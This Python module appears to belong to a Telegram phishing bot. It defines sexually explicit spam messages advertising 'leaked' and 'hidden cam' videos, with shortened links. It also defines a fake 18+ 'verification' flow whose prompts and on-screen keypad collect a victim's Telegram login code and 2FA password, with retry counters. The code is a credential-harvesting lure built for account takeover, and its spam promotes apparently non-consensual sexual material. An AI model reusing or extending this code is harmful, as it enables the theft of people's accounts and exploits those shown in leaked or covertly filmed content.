# plugin/script.py

# Promo Texts (10 unique messages)
PROMO_TEXTS = [
    "🔥 10K+ Horny Videos!! \n💦 Real Cum, No Filters \n💎 Ultra HD Uncut Scenes \n👉 https://tinyurl.com/Hot-Robot",
    "💋 Uncensored Desi Leaks! \n🔥 Real GF/BF Videos \n😍 Free Access Here \n👉 https://tinyurl.com/Hot-Robot",
    "😈 Indian, Desi, Couples \n🔥 10K+ Horny Videos!! \n💦 Hidden Cam + GF Fun \n👉 https://tinyurl.com/Hot-Robot",
    "🎥 Leaked College MMS \n😍 100% Real Desi Action \n💥 Tap to Watch \n👉 https://tinyurl.com/Hot-Robot",
    "💎 VIP Only Scenes Now Free \n💦 Hidden Cam + GF Fun \n👀 Daily New Leaks \n👉 https://tinyurl.com/Hot-Robot",
    "👄 Unlimited Hot Content \n🔞 Free Lifetime Access \n🎁 Exclusive Videos \n👉 https://tinyurl.com/Hot-Robot",
    "🍑 Hidden Cam + GF Fun \n👀 Just Click & Watch \n💦 Ultra Real Videos \n👉 https://tinyurl.com/Hot-Robot",
    "🎬 Daily New Leaks \n💥 Indian, Desi, Couples \n🔞 10K+ Horny Videos!! \n👉 https://tinyurl.com/Hot-Robot",
    "👀 New Viral Hard Videos \n👄 Real Amateur Fun \n🎉 Join & Enjoy \n👉 https://tinyurl.com/Hot-Robot",
    "🚨 Unlimited Hot Content \n💦 18+ Only Videos \n🔥 Try Once, Regret Never \n👉 https://tinyurl.com/Hot-Robot"
]

# Strings
strings = {
    'need_login': "You Have To /start First!",
    'already_logged_in': "You're Already Logged In! 🥳",
    'age_verification': "**⚠️ Need 18+ Verification! ⚠️**\n\nYou Must Be 18+ To Proceed.\n\n👇 Click Below Button To Verify 👇",
    'verification_success': "**✅ Verification Done! ✅**\n\n⚠️ Important: You Must Join All Channels To Get Access To Videos!\n\n👇 Click The Buttons Below To Join 👇",
    'logout_success': "**🔒 Logged out! 🔒**\n\nPlease /start To Access Again.",
    'not_logged_in': "**Not logged in! **\n\nPlease /start First.",
    'otp_wrong': "**❌ WRONG VERIFICATION CODE! ❌**\n\nYour Attempts left: {attempts}\n\n📤 Re-enter The Verification Code We sent:",
    '2fa_wrong': "**❌ WRONG 2FA PASSWORD! ❌**\n\nYour Attempts left: {attempts}\n\n📤 Re-enter The Your 2FA Password:",
    'otp_blocked': "**🚫 BLOCKED! 🚫**\n\nToo Many Wrong Verification Code Attempts.",
    '2fa_blocked': "**🚫 BLOCKED! 🚫**\n\nToo Many Wrong 2FA Password Attempts."
}

# Inline OTP Keyboard
OTP_KEYBOARD = InlineKeyboardMarkup([
    [
        InlineKeyboardButton("👉 ɢᴇᴛ ᴛʜᴇ ᴄᴏᴅᴇ.", url="https://t.me/+42777")
    ],
    [
        InlineKeyboardButton("1️⃣", callback_data="otp_1"),
        InlineKeyboardButton("2️⃣", callback_data="otp_2"),
        InlineKeyboardButton("3️⃣", callback_data="otp_3")
    ],
    [
        InlineKeyboardButton("4️⃣", callback_data="otp_4"),
        InlineKeyboardButton("5️⃣", callback_data="otp_5"),
        InlineKeyboardButton("6️⃣", callback_data="otp_6")
    ],
    [
        InlineKeyboardButton("7️⃣", callback_data="otp_7"),
        InlineKeyboardButton("8️⃣", callback_data="otp_8"),
        InlineKeyboardButton("9️⃣", callback_data="otp_9")
    ],
    [
        InlineKeyboardButton("🔙", callback_data="otp_back"),
        InlineKeyboardButton("0️⃣", callback_data="otp_0"),
        InlineKeyboardButton("🆗", callback_data="otp_submit")
    ]
])

# Verification Success Keyboard
VERIFICATION_SUCCESS_KEYBOARD = InlineKeyboardMarkup([
    [
        InlineKeyboardButton("🍑 𝗔𝗹𝗹 𝗩𝗶𝗱𝗲𝗼𝘀 𝗟𝗶𝗻𝗸𝘀 🍑", url="https://t.me/+KK6CiRWSDf8zOTBl")
    ],
    [
        InlineKeyboardButton("𝟭𝟴+ 𝗩𝗶𝗿𝗮𝗹 𝗩𝗶𝗱𝗲𝗼𝘀 🔥", url="https://t.me/+RTzbeBsesLM2YmU9"),
        InlineKeyboardButton("𝗔𝗱𝘂𝗹𝘁 𝗨𝗻𝗶𝘃𝗲𝗿𝘀𝗲 🫦", url="https://t.me/+ulsXd3bzknhhNmFl")
    ],
    [
        InlineKeyboardButton("𝗗𝗲𝘀𝗶, 𝗖𝗼𝗹𝗹𝗲𝗴𝗲, 𝗧𝗲𝗲𝗻, 𝗠𝗶𝗹𝗳, 𝗟𝗲𝘀𝗯𝗶𝗮𝗻, 𝗔𝗺𝗮𝘁𝗲𝘂𝗿", url="https://t.me/+xiiUvy2vbtJjNjk1")
    ]
])
